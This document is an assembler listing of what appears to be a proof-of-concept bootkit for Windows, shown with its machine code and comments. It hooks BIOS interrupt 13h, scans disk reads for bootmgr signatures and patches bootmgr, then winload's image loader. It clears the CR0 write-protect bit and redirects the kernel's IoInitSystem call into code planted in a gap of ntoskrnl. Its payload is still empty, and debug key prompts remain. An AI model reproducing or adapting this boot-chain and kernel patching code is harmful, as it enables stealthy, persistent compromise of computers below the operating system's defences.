     1                                  ; this code will be loaded in 0x7e00
     2                                  [bits 16]
     3                                  CPU x64 
     4                                  org 00h
     5                                  
     6                                  ; save all regs before execute the origin code
     7 00000000 6660                    pushad
     8                                  
     9                                  ; allocate 4096 bytes for the interrupt 13h background service
    10 00000002 BE1304                  mov si,0413h    ; using "base memory size in KB" of BIOS Data Area (0040h:0013h)
    11 00000005 832C04                  sub [si],word 4  ; 4096 bytes
    12 00000008 AD                      lodsw  ;  
    13 00000009 C1E006                  shl ax,6  ; * 1024 / 16
    14 0000000C 8EC0                    mov es,ax   ; store segment address
    15 0000000E 31FF                    xor di,di   ; offset
    16                                  
    17                                  ; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
    18 00000010 BE007E                  mov si,7e00h
    19 00000013 66B9[3C040000]          mov ecx,Total_End_of_Binary
    20 00000019 F3A4                    rep movsb
    21                                  
    22                                  ; backup old int 13h vector
    23 0000001B 66A14C00                mov eax,[13h * 4]     ; backup IVT vector 13h
    24 0000001F 2666A3[EA00]            mov [es:Forward_Interrupt_13h_Original + 1],eax   ; store the old jump address
    25                                  
    26                                  ; hook int 13h
    27 00000024 C7064C00[EE00]          mov [13h * 4],word Interrupt_13h_Hook  ; new address to jump to on "int 13h" instruction
    28 0000002A 8C064E00                mov [13h * 4 + 2],es     ; set segment to jump to on int 13h
    29                                  
    30 0000002E BE[5800]                mov si,Stage_0_Message
    31 00000031 81C6007E                add si, 7e00h
    32 00000035 E80A00                  call Print_Text
    33 00000038 E86301                  call wait_key
    34 0000003B 6661                    popad
    35                                  
    36                                  execute_origin_mbr:
    37                                  ; this will execute the origin mbr 
    38 0000003D EA007C0000              jmp 0000h:7c00h
    39                                  
    40                                  ; prints the text given in si
    41                                  Print_Text:
    42 00000042 6660                     pushad
    43 00000044 9C                      pushf
    44 00000045 BB0700                  mov bx,0007h                                    ; Page Number = 0, Attribute = 07h
    45 00000048 B40E                    mov ah,0Eh                                      ; Function 0Eh: Teletype Output
    46                                  
    47 0000004A 2EAC                    cs lodsb                                        ; load the first character
    48                                  
    49                                  Next_Char:
    50 0000004C CD10                    int 10h
    51 0000004E 2EAC                    cs lodsb                                        ; al = next character
    52 00000050 08C0                    or al,al                                        ; last letter?
    53 00000052 75F8                    jnz Next_Char                                   ; if not print next letter
    54 00000054 9D                      popf
    55 00000055 6661                    popad
    56 00000057 C3                      ret
    57                                  
    58 00000058 5E5F5F5F5F5E202070-     Stage_0_Message                 db      '^____^  press any key to continue:',13,10, 0
    58 00000061 7265737320616E7920-
    58 0000006A 6B657920746F20636F-
    58 00000073 6E74696E75653A0D0A-
    58 0000007C 00                 
    59 0000007D 426F6F746D67725F73-     Bootmgr_sign_found_Message                 db      'Bootmgr_sign_found press any key to patch SU module to gain control in protect mode:',13,10, 0
    59 00000086 69676E5F666F756E64-
    59 0000008F 20707265737320616E-
    59 00000098 79206B657920746F20-
    59 000000A1 706174636820535520-
    59 000000AA 6D6F64756C6520746F-
    59 000000B3 206761696E20636F6E-
    59 000000BC 74726F6C20696E2070-
    59 000000C5 726F74656374206D6F-
    59 000000CE 64653A0D0A00       
    60 000000D4 496E74657272757074-     Interrupt_13h_Message          db      'Interrupt_13h call',13,10, 0
    60 000000DD 5F3133682063616C6C-
    60 000000E6 0D0A00             
    61                                  
    62                                  Forward_Interrupt_13h_Original:
    63                                  ; jump to the original interrupt 13h handler (segment:offset will be patched dynamically)
    64 000000E9 EA00000000              jmp word 0000h:0000h
    65                                  
    66                                  ; now our background "service" starts, we get control only by int 13
    67                                  ; the code is now located at the end of memory (most likely 9F400h)
    68                                  ;direct declare string for print will crash because this code wille be relocate.
    69                                  Interrupt_13h_Hook:
    70                                  ; backup cpu ctx
    71 000000EE 6660                        pushad
    72 000000F0 9C                          pushf
    73 000000F1 80FC42                      cmp ah,42h                                                                      ; Extended Read?
    74 000000F4 7407                        jz read_handler
    75 000000F6 80FC02                      cmp ah,02h                                                                      ; Read?
    76 000000F9 0F859A00                    jnz exit_and_call_origin
    77                                  read_handler:
    78 000000FD BE[D400]                    mov si,Interrupt_13h_Message
    79 00000100 E83FFF                      call Print_Text
    80                                  
    81                                  ; restore cpu ctx
    82 00000103 9D                          popf
    83 00000104 6661                        popad
    84 00000106 50                          push ax; save the cmd
    85                                      ; simulate interrupt instruction
    86 00000107 9C                          pushfw
    87 00000108 0E                          push cs
    88 00000109 E8DDFF                      call word Forward_Interrupt_13h_Original
    89 0000010C 0F828100                    jc read_fail_handler
    90                                  
    91                                      ; read disk ok,   need more handle so save the result
    92 00000110 6660                        pushad ; 32
    93 00000112 9C                          pushf ; 2
    94                                  
    95 00000113 1E                          push ds  ; 2 data segment register will be modified to access this modules data
    96 00000114 06                          push es; 2
    97                                  
    98 00000115 89DF                        mov di,bx    ; di will store target buffer
    99 00000117 89E5                        mov bp,sp
   100 00000119 807E2602                    cmp byte [bp+ 38], 02h
   101 0000011D 7406                        jz Parameters_Normalized
   102 0000011F 8B4C02                      mov cx,[si+0x2]  ;get sector count
   103 00000122 C47C04                      les di,[si+0x4] ; get buffer
   104                                      Parameters_Normalized:
   105 00000125 C1E109                      shl cx,9 ; number of bytes = sector count * 512
   106 00000128 FC                          cld
   107                                  
   108                                      ; skip scan if bootmgr already patched.
   109                                      ;test [cs:Configuration_Bits],byte 00001000b 
   110                                      ;jnz bootmgr_already_patched
   111                                  
   112                                      ; now scan the read buffer for a signature in bootmgr
   113                                      ;   + 8A 46 ?? 98 3D 00 00 75 03 E9 03 00 E9 35 00
   114                                      ;     Windows Vista/7 bootmgr at address 06F2h
   115                                      ; patch applied: hooking code to call protected mode part
   116                                      ;   000205ec:  mov al, byte ptr ss:[bp+0xfff6]  ; 8a46f6    ->    call far 0020:0009f5c4    ; 669ac4f509002000
   117                                      ;   000205ef:  cbw                              ; 98        ->    
   118                                      ;   000205f0:  cmp ax, 0x0000                   ; 3d0000    ->    
   119                                      ;   000205f3:  jnz .+0x0003                     ; 7503      ->      (nop)                   ; 90
   120                                      ;   000205f5:  jmp .+0x0003                     ; e90300    ->    jmp .+0x0003              ; e90300
   121                                      ;   000205f8:  jmp .+0x0035                     ; e93500    ->    jmp .+0x0035              ; e93500
   122                                      Search_Signature_3:
   123 00000129 B08A                        mov al,8Ah
   124 0000012B F2AE                        repne scasb
   125 0000012D 755B                        jnz read_ok_handler                                                     ; if not found => exit
   126 0000012F 26803D46                    cmp byte [es:di],0x46
   127 00000133 75F4                        jnz Search_Signature_3
   128 00000135 2666817D02983D0000          cmp dword [es:di+2],00003D98h
   129 0000013E 75E9                        jnz Search_Signature_3
   130 00000140 2666817D067503E903          cmp dword [es:di+6],03E90375h
   131 00000149 75DE                        jnz Search_Signature_3
   132 0000014B 2666817D0A00E93500          cmp dword [es:di+10],0035E900h
   133 00000154 75D3                        jnz Search_Signature_3
   134                                  
   135                                      ; in win7sp1_x32 this will execute twice
   136                                      ; but in win8.1_x64 will only execute  once
   137                                      ; apply patch:
   138                                      ;   + 66 9A ADDRESS 20 90
   139                                      Found_Signature_bootmgr:
   140 00000156 2E800E[9D01]08              or [cs:Configuration_Bits],byte 00001000b 
   141 0000015C 4F                          dec di
   142 0000015D BE[7D00]                    mov si,Bootmgr_sign_found_Message
   143 00000160 E8DFFE                      call Print_Text
   144 00000163 E83800                      call wait_key
   145                                      ;jmp read_ok_handler
   146                                     ;jmp Remove_Interrupt_13h_Hook
   147                                      
   148                                      ; do patch work
   149 00000166 26C705669A                  mov word [es:di],0x9A66   ; patch something
   150 0000016B 6631C0                      xor eax,eax
   151 0000016E 8CC8                        mov ax,cs
   152 00000170 66C1E004                    shl eax,4
   153 00000174 6605[A9010000]              add eax,Entry_Point_OS_Vista
   154 0000017A 2666894502                  mov [es:di+0x2],eax 
   155 0000017F 26C745062000                mov word [es:di+0x6],0x20  
   156 00000185 26C6450890                  mov byte [es:di+0x8],0x90 
   157                                  
   158                                  ;Remove_Interrupt_13h_Hook:
   159                                      ;mov eax,[Forward_Interrupt_13h_Original+1]   ; offset of original int 13h
   160                                     ; xor bx,bx
   161                                      ;mov ds,bx
   162                                    ;  mov [13h * 4],eax               ; restore interrupt 13h vector (reset offset)
   163                                  
   164                                  bootmgr_already_patched:
   165                                  read_ok_handler:
   166 0000018A 07                      pop es   ; restore all register contents as it was before this hook
   167 0000018B 1F                      pop ds
   168 0000018C 9D                      popf
   169 0000018D 6661                    popad
   170 0000018F B400                    mov ah,0
   171                                  read_fail_handler:
   172 00000191 83C402                      add sp, 2 ; pop the cmd
   173 00000194 CA0200                      retf 2
   174                                  
   175                                  exit_and_call_origin:
   176 00000197 9D                          popf
   177 00000198 6661                        popad
   178 0000019A E94CFF                      jmp Forward_Interrupt_13h_Original
   179                                  
   180 0000019D 00                      Configuration_Bits    db  00000000b
   181                                  
   182                                  wait_key:
   183 0000019E 6660                    pushad
   184 000001A0 9C                      pushf
   185 000001A1 30E4                    xor ah,ah                                       ; Function 00h: Get Keystroke
   186 000001A3 CD16                    int 16h
   187 000001A5 9D                      popf
   188 000001A6 6661                    popad
   189 000001A8 C3                      ret
   190                                  
   191                                  ; protected code start called by bootmgr SU module
   192                                  [bits 32]
   193                                  Entry_Point_OS_Vista:
   194 000001A9 90                      nop
   195 000001AA 90                      nop
   196 000001AB 90                      nop
   197 000001AC 90                      nop
   198 000001AD 60                      pushad
   199 000001AE 06                      push es
   200 000001AF 1E                      push ds
   201                                  
   202                                  ; we need to set correct segment register (this is also why this function was far called)
   203                                  ;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
   204                                  ;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   205                                  ;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
   206                                  ;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   207                                  ;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   208                                  ;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   209                                  ;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
   210                                  ;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
   211                                  ;   gdtr:base=0x0001f000, limit=0x7f
   212                                  ;   idtr:base=0x0001f080, limit=0x7ff
   213 000001B0 B830000000              mov eax,0x30   ; set to 30h, Data Segment
   214 000001B5 8EC0                    mov es,ax
   215 000001B7 8ED8                    mov ds,ax
   216                                  ; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
   217 000001B9 BF00004000              mov edi,00400000h   ; OS Loader base
   218 000001BE B900000F00              mov ecx,960 * 1024 
   219 000001C3 E800000000              call dword Get_Current_EIP_2
   220                                  Get_Current_EIP_2:
   221 000001C8 5E                      pop esi
   222 000001C9 81C6D5000000            add esi,Relocate_Me_Code - Get_Current_EIP_2
   223 000001CF E83B000000              call dword Hook_BootMgrExe
   224                                  
   225 000001D4 1F                      pop ds   ; restore them
   226 000001D5 07                      pop es
   227 000001D6 61                      popad
   228 000001D7 CB                      retf
   229                                  
   230                                  FakeImgpLoadPEImage:
   231                                  ; 1. add origin fail branch later, now we assume everything work ok.
   232                                  ; 用 ebp 来定位局部变量
   233                                  ; 2. ebp-0xb8 ptr ptr to image base
   234                                  ; ebp-0x98 len ptr ptr to image size
   235                                  
   236 000001D8 E8D0000000              call  Obfuscation_Function
   237                                  
   238                                  ; edi now in dos header
   239 000001DD 8BBD48FFFFFF            mov edi,[ebp-0xb8]
   240                                  ; valid dos  
   241 000001E3 66813F4D5A              cmp word [edi],'MZ' ; verify dos Signature
   242 000001E8 7520                    jnz Exit_FakeImgpLoadPEImage
   243                                  
   244 000001EA 037F3C                  add edi,dword [edi+0x3c]
   245                                  ; valid PE 
   246 000001ED 66813F5045              cmp word [edi],'PE' ; verify PE Signature
   247 000001F2 7516                    jnz Exit_FakeImgpLoadPEImage
   248 000001F4 66817F180B02            cmp word [edi+0x18],020Bh  ; 020Bh, Magic Number (PE64)
   249 000001FA 750E                    jnz Exit_FakeImgpLoadPEImage
   250                                  
   251 000001FC 8B4F50                  mov ecx,[edi+0x50]  ; SizeOfImage
   252 000001FF 81E700F0FFFF            and edi,0FFFFF000h  ; page base address of PE Image
   253 00000205 E848000000              call dword Hook_OslLoadImage
   254                                  
   255                                  Exit_FakeImgpLoadPEImage:
   256 0000020A E9BB000000              jmp Obfuscation_Return ; return to Windows
   257                                  
   258                                  Hook_BootMgrExe:
   259                                  ; Input
   260                                  ;   esi = address of Relocate_Me_Code
   261                                  ;   edi = address of memory to scan
   262                                  ;   ecx = bytes to scan
   263                                  ; Output
   264                                  ; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
   265 0000020F 51                      push ecx
   266 00000210 57                      push edi
   267                                  
   268                                  ; scan bootmgr!bootmgr.exe for _ImgArchPcatLoadBootApplication@28
   269                                  ; _text:0041C016 E8 EB 54 00 00                          call    _ImgArchPcatLoadBootApplication@28 ; ImgArchPcatLoadBootApplication(x,x,x,x,x,x,x)
   270                                  ; _text:0041C01B 8B F0                                   mov     esi, eax
   271                                  ; _text:0041C01D                         ; 110:       if ( v9 < 0 )
   272                                  ; _text:0041C01D 85 F6                                   test    esi, esi
   273                                  ; _text:0041C01F 0F 88 86 01 00 00                       js      loc_41C1AB
   274                                  ; _text:0041C025                         ; 115:       v4 = v30;
   275                                  ; _text:0041C025 83 3D 8C 44 4B 00 00                    cmp     _BdDebugTransitions, 0
   276                                  ; _text:0041C02C 8B 7C 24 1C                             mov     edi, [esp+0D0h+var_B4]
   277                                  ; patch 0041C01B - 0041C01F to
   278                                  ; ff 15 [FakeImgpLoadPEImage] nop  nop nop nop
   279                                  ; 8B F0 85 F6 0F 88 ?? ?? ?? ?? 83 3D ?? ?? ?? ?? ?? 8B
   280                                  
   281                                  Search_Unknown_Signature:
   282 00000211 B08B                    mov al,0x8B
   283 00000213 F2AE                    repne scasb
   284 00000215 7538                    jnz Hook_BootMgrExe_Exit
   285 00000217 817FFF8BF085F6          cmp dword [edi-0x1],0xF685F08B
   286 0000021E 75F1                    jnz Search_Unknown_Signature
   287 00000220 66817F030F88            cmp word [edi+0x3],0x880F
   288 00000226 75E9                    jnz Search_Unknown_Signature
   289 00000228 66817F09833D            cmp word [edi+0x9],0x3D83
   290 0000022E 75E1                    jnz Search_Unknown_Signature
   291 00000230 807F108B                cmp byte [edi+0x10],0x8B
   292 00000234 75DB                    jnz Search_Unknown_Signature
   293                                  
   294                                  ; backup 10 bytes to overwrite them with custom code
   295                                  ; break in 0x9edf5
   296 00000236 4F                      dec edi                                                                         ; -1 to get to start of signature
   297                                  
   298                                  ; store new code: FF 15 + address  (call hook)
   299 00000237 66B8FF15                mov ax,0x15FF  ; FF 15, opcodes of call [address]
   300 0000023B 66AB                    stosw          
   301 0000023D 8D863BFFFFFF            lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
   302 00000243 268906                  mov [es:esi],eax ; set the Hook_Address variable
   303 00000246 8D06                    lea eax,[esi]   ; get address of variable address, used for call [address]
   304 00000248 AB                      stosd 
   305 00000249 B890909090              mov eax, 0x90909090
   306 0000024E AB                      stosd
   307                                  
   308                                  Hook_BootMgrExe_Exit:
   309 0000024F 5F                      pop edi
   310 00000250 59                      pop ecx
   311 00000251 C3                      ret
   312                                  
   313                                  
   314                                  Hook_OslLoadImage:
   315 00000252 51                      push ecx
   316 00000253 57                      push edi
   317                                  
   318                                  ; gain control after BlImgLoadPEImageEx retrun in OslLoadImage function
   319                                  ;_text:00000000008E159E E8 31 52 03 00                          call    BlImgLoadPEImageEx
   320                                  ;_text:00000000008E15A3 8B F0                                   mov     esi, eax
   321                                  ;_text:00000000008E15A5                         ; 262:   if ( v27 >= 0 )
   322                                  ;_text:00000000008E15A5 85 C0                                   test    eax, eax
   323                                  ;_text:00000000008E15A7 0F 88 F5 01 00 00                       js      loc_8E17A2
   324                                  ;_text:00000000008E15AD                         ; 264:     v7 = vars20;
   325                                  ;_text:00000000008E15AD 48 8B B5 B0 00 00 00                    mov     rsi, [rbp+90h+var_s20]
   326                                  ;  特征码
   327                                  ;  8B F0 85 C0 0F 88 ?? ?? ?? ??  48 8B B5
   328                                  
   329                                  Search_Osl_Signature:
   330 00000254 B08B                    mov al,0x8B
   331 00000256 F2AE                    repne scasb
   332 00000258 7540                    jnz Hook_OslLoadImage_Exit
   333 0000025A 817FFF8BF085C0          cmp dword [edi-0x1],0xc085F08B
   334 00000261 75F1                    jnz Search_Osl_Signature
   335 00000263 66817F030F88            cmp word [edi+0x3],0x880f
   336 00000269 75E9                    jnz Search_Osl_Signature
   337 0000026B 66817F09488B            cmp word [edi+0x9],0x8b48
   338 00000271 75E1                    jnz Search_Osl_Signature
   339 00000273 807F0BB5                cmp byte [edi+0xb],0xB5
   340 00000277 75DB                    jnz Search_Osl_Signature
   341 00000279 4F                      dec edi
   342                                  
   343                                  ; winload_Fail_Ret_Address
   344                                  ; tmp save fail branch
   345 0000027A 8B4706                  mov eax,[edi + 6]
   346 0000027D 01F8                    add eax,edi
   347 0000027F 83C00A                  add eax,0xa
   348 00000282 894604                  mov [esi+4], eax
   349                                  
   350                                  ; uncomment next line to give up patch
   351                                  ; jmp Hook_OslLoadImage_Exit
   352                                  
   353                                  ; store new code: FF 15 + address  (call hook)
   354                                  ; mov ax,0x15FF  ; FF 15, opcodes of call [address]
   355 00000285 B0E8                    mov al, 0xe8
   356 00000287 AA                      stosb         
   357 00000288 8D4670                  lea eax,[esi - (Relocate_Me_Code - OslFakeImgpLoadPEImage)]   ; get offset of hook code
   358 0000028B 29F8                    sub eax,edi
   359 0000028D 83E804                  sub eax,4
   360 00000290 AB                      stosd 
   361 00000291 B890909090              mov eax, 0x90909090
   362 00000296 AB                      stosd
   363 00000297 B090                    mov al,0x90
   364 00000299 AA                      stosb
   365                                  
   366                                  Hook_OslLoadImage_Exit:
   367 0000029A 5F                      pop edi
   368 0000029B 59                      pop ecx
   369 0000029C C3                      ret
   370                                  
   371                                  Relocate_Me_Code:
   372 0000029D 00000000                Hook_Address    dd  0
   373 000002A1 00000000                winload_Fail_Ret_Address    dd  0
   374 000002A5 00000000                Some_Flag dd 0
   375 000002A9 00000000                ntkernel_Hook_Address    dd  0
   376                                  
   377                                  Obfuscation_Function:
   378                                  ; [stack + 0] = address to jump to
   379                                  ; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
   380                                  
   381                                  ; Output:
   382                                  ; esi = pointer to Relocate_Me_Code
   383                                  ; edi = pointer to return code of Windows / Argument 2
   384                                  
   385                                  ; during execution all memory access is possible is cr0.wp cleared
   386                                  ; return by jumping to Obfuscation_Return
   387                                  
   388                                  ;  入栈顺序 EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI
   389 000002AD 60                      pushad   ; +32
   390 000002AE 9C                      pushfd     ; +4
   391 000002AF FC                      cld
   392                                  
   393                                  ; clear cr0.Write Protect flag (to allow writing into read-only user pages)
   394 000002B0 0F20C0                  mov eax,cr0
   395 000002B3 50                      push eax ; +4
   396 000002B4 25FFFFFEFF              and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
   397                                  
   398                                  ; set parameters and call
   399 000002B9 8B7C242C                mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
   400 000002BD E800000000              call dword Get_Current_EIP_0
   401                                  Get_Current_EIP_0:
   402 000002C2 5E                      pop esi ; esi = eip
   403 000002C3 83EE25                  sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
   404 000002C6 FF642428                jmp [esp+0x28]   ; jump
   405                                  
   406                                  ; restore cr0.wp
   407                                  Obfuscation_Return:
   408 000002CA 58                      pop eax
   409 000002CB 0F22C0                  mov cr0,eax   ; everything done fine, restore it and give control back to Windows
   410                                  
   411 000002CE 9D                      popfd
   412 000002CF 61                      popad
   413 000002D0 83C404                  add esp,4
   414 000002D3 C3                      ret 
   415                                  
   416                                  [bits 64]
   417                                  Obfuscation_Function_x64:
   418                                  
   419                                  ;  入栈顺序 EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI
   420                                  ; pusha   ; +64 not avaliable in x64 mode
   421 000002D4 50                      push rax
   422 000002D5 51                      push rcx
   423 000002D6 52                      push rdx
   424 000002D7 53                      push rbx
   425 000002D8 4883EC08                sub rsp,8
   426 000002DC 55                      push rbp
   427 000002DD 56                      push rsi
   428 000002DE 57                      push rdi
   429 000002DF 9C                      pushf     ; +8
   430 000002E0 FC                      cld
   431                                  
   432                                  ; clear cr0.Write Protect flag (to allow writing into read-only user pages)
   433 000002E1 0F20C0                  mov rax,cr0
   434 000002E4 50                      push rax ; +8
   435 000002E5 25FFFFFEFF              and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
   436                                  
   437 000002EA E800000000              call  qword  Get_Current_EIP_1
   438                                  Get_Current_EIP_1:
   439 000002EF 5E                      pop rsi ; esi = eip
   440 000002F0 4883EE52                sub rsi,Get_Current_EIP_1 - Relocate_Me_Code   ; set rsi to Relocate_Me_Code absolute address
   441 000002F4 FF642450                jmp [rsp+0x50]   ; jump
   442                                  
   443                                  Obfuscation_Return_x64:
   444 000002F8 58                      pop rax
   445 000002F9 0F22C0                  mov cr0,rax   ; everything done fine, restore it and give control back to Windows
   446                                  
   447 000002FC 9D                      popfq
   448                                  ; popaq
   449 000002FD 5F                      pop rdi
   450 000002FE 5E                      pop rsi
   451 000002FF 5D                      pop rbp
   452 00000300 4883C408                add rsp,8
   453 00000304 5B                      pop rbx
   454 00000305 5A                      pop rdx
   455 00000306 59                      pop rcx
   456 00000307 58                      pop rax
   457 00000308 4883C408                add rsp,8
   458 0000030C C3                      ret
   459                                  
   460                                  OslFakeImgpLoadPEImage:
   461                                  ; 用 rbp 来定位局部变量
   462                                  ; rbp-0x90 image size
   463                                  ; rbp-0x80 image base
   464 0000030D 89C6                    mov     esi, eax
   465 0000030F E8C0FFFFFF              call Obfuscation_Function_x64
   466                                  
   467                                  ; get ret value of OslLoader!BlImgLoadPEImageEx
   468 00000314 488B442448              mov rax,[rsp + 0x48]
   469 00000319 85C0                    test    eax, eax
   470 0000031B 7839                    js jmp_to_fail_branch
   471                                  
   472                                  ; you can do work now
   473                                  ; check a flag bit if we already patch ntoskernel.exe
   474 0000031D 8B7E08                  mov edi, dword  [rsi + 8]
   475 00000320 83E701                  and edi,0x1
   476 00000323 752F                    jnz Exit_OslFakeImgpLoadPEImage
   477                                  
   478                                  ; rdi now in dos header
   479 00000325 488B7D80                mov rdi,[rbp-0x80]
   480 00000329 66813F4D5A              cmp word [rdi],'MZ' ; verify dos Signature
   481 0000032E 7524                    jnz Exit_OslFakeImgpLoadPEImage
   482                                  
   483 00000330 8B473C                  mov eax  ,dword [rdi+0x3c]
   484 00000333 4801C7                  add rdi, rax
   485 00000336 66813F5045              cmp word [rdi],'PE' ; verify PE Signature
   486 0000033B 7517                    jnz Exit_OslFakeImgpLoadPEImage
   487 0000033D 66817F180B02            cmp word [rdi+0x18],020Bh  ; 020Bh, Magic Number (PE64)
   488 00000343 750F                    jnz Exit_OslFakeImgpLoadPEImage
   489                                  
   490 00000345 8B4F50                  mov ecx,[rdi+0x50]  ; SizeOfImage
   491 00000348 4881E700F0FFFF          and rdi, 0FFFFFFFFFFFFF000h  ; page base address of PE Image
   492 0000034F E80D000000              call  Hook_NtosKerenelImage
   493                                  
   494                                  Exit_OslFakeImgpLoadPEImage:
   495 00000354 EBA2                    jmp Obfuscation_Return_x64
   496                                  
   497                                  jmp_to_fail_branch:
   498                                  ; change ret addr to error branch
   499 00000356 678B4604                mov eax, [esi+4]
   500 0000035A 6789442458              mov [esp+0x58], eax
   501 0000035F EB97                    jmp Obfuscation_Return_x64
   502                                  
   503                                  Hook_NtosKerenelImage:
   504 00000361 51                      push rcx
   505 00000362 57                      push rdi
   506                                  
   507                                  ; 48 8B CB E8 ?? ?? ?? ?? 84 C0 74 ?? 40 8A D7
   508                                  ; PAGE:00000001404F406A 48 8B CB                                mov     rcx, rbx
   509                                  ; PAGE:00000001404F406D E8 6E FE 20 00                          call    IoInitSystem
   510                                  ; PAGE:00000001404F4072 84 C0                                   test    al, al
   511                                  ; PAGE:00000001404F4074 74 1C                                   jz      short loc_1404F4092
   512                                  ; PAGE:00000001404F4076 40 8A D7                                mov     dl, dil
   513                                  
   514                                  Search_Ntoskernel_Signature:
   515 00000363 B048                    mov al,0x48
   516 00000365 F2AE                    repne scasb
   517 00000367 0F85B3000000            jnz Hook_NtosKerenelImage_Exit
   518 0000036D 817FFF488BCBE8          cmp dword [rdi-0x1],0xE8CB8B48
   519 00000374 75ED                    jnz Search_Ntoskernel_Signature
   520 00000376 66817F0784C0            cmp word [rdi + 0x7],0xC084
   521 0000037C 75E5                    jnz Search_Ntoskernel_Signature
   522 0000037E 807F0974                cmp byte [rdi + 0x9],0x74
   523 00000382 75DF                    jnz Search_Ntoskernel_Signature
   524 00000384 66817F0B408A            cmp word [rdi + 0xb],0x8A40
   525 0000038A 75D7                    jnz Search_Ntoskernel_Signature
   526 0000038C 807F0DD7                cmp byte [rdi + 0xd],0xD7
   527 00000390 75D1                    jnz Search_Ntoskernel_Signature
   528                                  ; move to  call    IoInitSystem
   529 00000392 4883C702                add rdi,2
   530                                  
   531                                  ; foud signature, begin patch
   532                                  ; set a flag bit  indicate  we already patch ntoskernel.exe
   533 00000396 834E0801                or  dword  [rsi + 8], 0x1
   534                                  
   535                                  ; move code ntoskernel code gap
   536                                  ; section va         size
   537                                  ; POOLCODE 002A3000  000028A7
   538 0000039A 57                      push rdi
   539 0000039B 488B7C2408              mov rdi,[rsp+0x8] ; rdi  <-- imagebase of ntoskernel.exe
   540 000003A0 4881C700302A00          add rdi,0x2A3000
   541 000003A7 4881C7A7280000          add rdi,0x28A7
   542                                  
   543 000003AE 56                      push rsi
   544 000003AF 4881C686010000          add rsi,springboard-Relocate_Me_Code
   545 000003B6 B919000000              mov rcx,Total_End_of_Binary - springboard
   546 000003BB F3A4                    rep movsb
   547 000003BD 5E                      pop rsi
   548                                  
   549                                  ; now code in ntoskernel gap, do patch
   550 000003BE 5F                      pop rdi
   551 000003BF 488B1C24                mov rbx,[rsp] ; rbx  <-- imagebase of ntoskernel.exe
   552 000003C3 4881C300302A00          add rbx,0x2A3000
   553 000003CA 4881C3A7280000          add rbx,0x28A7 ; rbx <-- code gap begin springboard in gas
   554                                  
   555 000003D1 53                      push rbx
   556 000003D2 4889DA                  mov rdx, rbx
   557 000003D5 4883C208                add rdx,instruction_jmp_back-springboard ; rdx <--  jmp_back in gas
   558 000003D9 5B                      pop rbx
   559                                  
   560 000003DA 8B4701                  mov eax,dword [rdi + 0x1]
   561 000003DD 4883E0FF                and rax,0xffffffff
   561          ******************       warning: signed dword value exceeds bounds
   562 000003E1 488D4F05                lea rcx,[rdi + 0x5]
   563 000003E5 4801C1                  add rcx,rax ;rcx  <--  address of IoInitSystem
   564                                  
   565                                  ; change call    IoInitSystem to jmp springboard
   566 000003E8 C607E9                  mov byte [rdi], 0xe9
   567 000003EB 53                      push rbx
   568 000003EC 4829FB                  sub rbx,rdi
   569 000003EF 4883EB05                sub rbx,5
   570 000003F3 895F01                  mov dword [rdi + 0x1],ebx
   571 000003F6 5B                      pop rbx
   572                                  
   573                                  ; fix  instruction_jmp_back
   574 000003F7 4883C705                add rdi,5 ; <-- now rdi is origin  call IoInitSystem ret addr.
   575 000003FB 4829D7                  sub rdi,rdx
   576 000003FE 4883EF05                sub rdi,5
   577 00000402 897A01                  mov dword [rdx + 0x1], edi
   578                                  
   579                                  ; fix  instruction_call_io_init_system
   580 00000405 4829D9                  sub rcx, rbx
   581 00000408 4883E905                sub rcx,5
   582 0000040C 894B01                  mov dword [rbx + 0x1],ecx
   583                                  
   584                                  ; save  ntoskerenel image base
   585 0000040F 56                      push rsi
   586 00000410 4881C693010000          add rsi,Ntoskrnl_BaseAddress-Relocate_Me_Code
   587 00000417 488B442408              mov rax,[rsp + 0x8]
   588 0000041C 488906                  mov [rsi], rax
   589 0000041F 5E                      pop rsi
   590                                  
   591                                  Hook_NtosKerenelImage_Exit:
   592 00000420 5F                      pop rdi
   593 00000421 59                      pop rcx
   594 00000422 C3                      ret
   595                                  
   596                                  springboard:
   597                                  ; call IoInitSystem
   598 00000423 E800000000              instruction_call_io_init_system db 0xe8,0x0,0x0,0x0,0x0
   599                                  handler_after_io_init_system_ret:
   600 00000428 90                      nop
   601 00000429 90                      nop
   602 0000042A 90                      nop
   603 0000042B E900000000              instruction_jmp_back db 0xe9,0x0,0x0,0x0,0x0
   604                                  
   605                                  ; data following, [ebp - 32] will point to here
   606                                  Data_Reference:
   607                                  Subsystem_Variables:
   608 00000430 00000000                Ntoskrnl_BaseAddress        dd  0
   609 00000434 00000000                Callback_NotifyDriverLoad   dd  0
   610 00000438 00000000                Memory_Pool                 dd  0
   611                                  
   612                                  Total_End_of_Binary:
   613 0000043C 00<rept>                times 4*1024-($-$$) db 0
